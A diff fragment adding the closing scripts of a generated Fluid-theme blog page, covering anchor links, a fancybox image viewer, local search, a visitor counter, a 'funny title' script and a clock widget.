+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+
+
+  <!--下面两行是核心内容-->
+  <link  rel="stylesheet" href="/css/TrymenT-ClocK.min.css" />
+  <script  src="/js/TrymenT-ClocK.min.js" ></script>
+ 
